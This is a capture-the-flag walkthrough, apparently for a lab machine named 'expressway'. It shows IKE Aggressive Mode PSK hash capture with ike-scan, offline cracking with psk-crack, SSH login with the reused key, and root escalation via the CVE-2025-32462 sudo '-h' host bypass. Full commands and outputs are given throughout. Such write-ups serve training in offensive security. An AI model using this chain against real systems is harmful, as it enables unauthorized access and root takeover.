OS: Linux (Debian)
IP: 10.10.11.87

Recon

nmap -Pn -sC -sV -p- --min-rate 2000 -oN nmap-scan.txt 10.10.11.87
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)

Only SSH exposed on TCP. Run a UDP scan of the top ports:

nmap -Pn -sU -sV -T3 --top-ports 25 -oN udp-nmap-scan.txt 10.10.11.87
PORT     STATE SERVICE VERSION
500/udp  open  isakmp?

IKE/ISAKMP on 500/udp is a VPN handshake service. Worth checking for IKE Aggressive Mode with pre-shared keys — it leaks the PSK hash (offline-crackable) and embeds the group/user identity in the ID payload.

IKE Aggressive Mode — PSK Hash + Identity Leak

IKE Phase 1 in Aggressive Mode with PSK authentication is structurally vulnerable: the responder sends back a hash of the PSK and a clear-text ID payload in a single round trip. An attacker on the network path can capture both offline with no prior credential.

Probe the target for aggressive-mode handshake and extract the PSK parameters:

ike-scan --showbackoff -M -A -P -R 10.10.11.87

Flags:

  • -M multiline output
  • -A aggressive mode
  • -P extract PSK hash + nonces in crackable format
  • -R randomize host order
10.10.11.87     Aggressive Mode Handshake returned
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
    Hash(20 bytes)

Two findings:

  • Identity leaked: ike@expressway.htb — both a username (ike) and a vhost (expressway.htb).
  • PSK hash extracted: hash_r and associated nonces are saved to psk_key.txt in ike-scan's native format for cracking.

PSK Cracking

Crack the captured PSK with psk-crack (shipped with ike-scan):

psk-crack -d /usr/share/wordlists/rockyou.txt psk_key.txt
key "freakingrockstarontheroad" matches SHA1 hash 3f03f7d89658933dc3f5a91641d534a4df936234

Foothold — SSH with Reused PSK

The cracked PSK is reused as the SSH password for the ike user (identity taken from the IKE ID payload):

ssh ike@10.10.11.87
# password: freakingrockstarontheroad
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ cat user.txt

The ike user is in the proxy group. Enumerate what that grants:

find / -group proxy -type d 2>/dev/null
/run/squid
/var/spool/squid
/var/log/squid

Squid proxy logs are readable. Check the access log:

cat /var/log/squid/access.log.1
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html

A second vhost, offramp.expressway.htb, is referenced. This becomes relevant for the sudo bypass below.

CVE-2025-32462 — sudo -h host Policy Bypass

LinEnum flagged an unusual sudo path: /usr/local/bin/sudo instead of the distro default /usr/bin/sudo. Version check:

sudo -V
Sudo version 1.9.17

Sudo 1.9.17 is vulnerable to CVE-2025-32462 — the "Policy-Check Flaw." The -h / --host option was only ever intended for sudo -l (listing privileges against a named host), but in affected versions it could be passed to any invocation. This lets an attacker force sudo to evaluate host-specific policy for an arbitrary hostname; if that host's sudoers grants NOPASSWD: ALL, the command runs as root regardless of local policy.

Check what policy applies when targeting the vhost discovered in the Squid log:

sudo -h offramp.expressway.htb -l
User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL

Apply the same host argument to an actual command to spawn a root shell:

sudo -h offramp.expressway.htb bash
root@expressway:/var/log/squid# cat /root/root.txt
